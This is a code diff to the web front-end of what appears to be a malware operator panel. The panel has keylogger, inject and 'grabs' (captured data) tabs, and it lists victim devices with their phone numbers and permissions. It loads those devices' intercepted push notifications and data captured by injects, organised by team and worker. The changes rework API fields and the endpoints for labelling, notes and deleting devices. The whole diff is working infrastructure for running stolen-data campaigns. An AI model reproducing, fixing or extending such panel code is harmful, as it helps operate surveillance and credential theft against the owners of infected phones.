@@ -3396,9 +3396,8 @@
                 <div class="tab-content" id="tabLocation" style="display:none;"></div>
                 <div class="tab-content" id="tabKeylogger" style="display:none;"></div>
                 <div class="tab-content" id="tabInjects" style="display:none;"></div>
-
                 <div class="tab-content" id="tabGrabs" style="display:none;">
-                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+                   <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
                         <div style="font-weight:600;color:var(--text-primary);" data-i18n="grabs_title">Захваченные данные</div>
                         <div style="display:flex;gap:6px;">
                             <button onclick="exportGrabs()" style="padding:4px 10px;font-size:11px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:var(--text-secondary);border-radius:5px;cursor:pointer;" data-i18n="grabs_export">Экспорт</button>
@@ -4341,8 +4340,8 @@
                     region: d.country || d.region || 'Unknown',
                     firstSeen: formatDate(d.created_at),
                     connectedAgo: formatTimeAgo(d.created_at),  // Time since connection
-                    phone: d.phone_number || L('dev_phone_unknown'),
-                    phone2: d.phone_number_2 || '',
+                    phone: d.phone || L('dev_phone_unknown'),
+                    phone2: d.phone2 || '',
                     worker: d.worker_id || d.worker || 'N/A',
                     workerUsername: d.worker_username || '',
                     screenOn: d.screen_on || false,
@@ -4455,14 +4454,14 @@
         
         async function loadDevicePush(deviceId) {
             const data = await fetchAPI(`/api/panel/device/push/${teamId}/${deviceId}?limit=50`);
-            if (data && data.push) {
-                return data.push.map(p => ({
-                    app: p.app_name || p.package_name || 'Unknown',
+            if (data && data.logs) {
+                return data.logs.map(p => ({
+                    app: p.package || 'Unknown',
                     title: p.title || '',
                     text: p.text || p.body || '',
                     time: formatTime(p.created_at),
                     created_at: p.created_at,  // Сохраняем сырой timestamp для закладок
-                    package: p.package_name || ''
+                    package: p.package || ''
                 }));
             }
             return [];
@@ -5147,7 +5146,7 @@
             // ===== GRABS badge preload =====
             try {
                 const gTeam = window._teamId || localStorage.getItem('team_id') || '';
-                const gResp = await fetch(`/api/panel/device/grabs/${gTeam}/${device.id}`, { headers: { 'Cookie': document.cookie } });
+                const gResp = await fetch(`/api/panel/device/grabs/${gTeam}/${device.id}`, { credentials: 'same-origin' });
                 const gJson = await gResp.json();
                 grabsData = gJson.grabs || [];
                 grabsLoaded = true;
@@ -6681,10 +6680,11 @@
             if (!currentDevice) return;
             
             try {
-                const response = await fetch(`${API_URL}/api/panel/label/${teamId}/${currentDevice.id}?login=${encodeURIComponent(userLogin)}&role=${encodeURIComponent(userRole)}`, {
+                const response = await fetch(`${API_URL}/api/panel/device/label`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ label: label })
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ device_id: currentDevice.id, label: label, notes: currentDevice.notes || '' })
                 });
                 
                 const data = await response.json();
@@ -6723,10 +6723,11 @@
             statusEl.textContent = '...';
             
             try {
-                const response = await fetch(`${API_URL}/api/panel/notes/${teamId}/${currentDevice.id}?login=${encodeURIComponent(userLogin)}&role=${encodeURIComponent(userRole)}`, {
+                const response = await fetch(`${API_URL}/api/panel/device/label`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ notes: notes })
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ device_id: currentDevice.id, label: currentDevice.label || '', notes: notes })
                 });
                 
                 const data = await response.json();
@@ -6767,13 +6768,11 @@
             console.log('Deleting device:', deviceId, 'URL:', `${API_URL}/api/panel/device/${teamId}/${deviceId}`);
             
             try {
-                const response = await fetch(`${API_URL}/api/panel/device/${teamId}/${deviceId}?login=${encodeURIComponent(userLogin)}&role=${encodeURIComponent(userRole)}`, {
+                const response = await fetch(`${API_URL}/api/panel/device/delete`, {
                     method: 'DELETE',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    mode: 'cors'
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ device_id: deviceId })
                 });
                 
                 console.log('Delete response status:', response.status);
@@ -7499,7 +7498,7 @@
                                 carrier: d.carrier || d.operator || 'Unknown',
                                 region: d.country || d.region || 'Unknown',
                                 firstSeen: formatDate(d.created_at),
-                                phone: d.phone_number || 'Неизвестен',
+                                phone: d.phone || 'Неизвестен',
                                 worker: d.worker_id || d.worker || 'N/A',
                                 screenOn: d.screen_on || false,
                                 permissions: d.permissions || {},
@@ -8570,7 +8569,7 @@
             html += '<th style="text-align:left;padding:8px 12px;color:#667;font-size:0.7rem;font-weight:500;">Данные</th></tr></thead><tbody>';
             injectData.forEach(r => {
                 const time = r.created_at ? new Date(r.created_at).toLocaleString(LANG === 'ru' ? 'ru-RU' : 'en-US') : '';
-                const cd = r.captured_data || {};
+                const cd = r.data || {};
                 const dStr = Object.entries(cd).map(([k,v]) => `<span style="color:#4dabf7;">${_esc(k)}</span>: ${_esc(String(v))}`).join(' &middot; ');
                 html += `<tr style="border-bottom:1px solid rgba(255,255,255,0.03);">`;
                 html += `<td style="padding:6px 12px;font-size:0.7rem;color:#888;white-space:nowrap;">${time}</td>`;
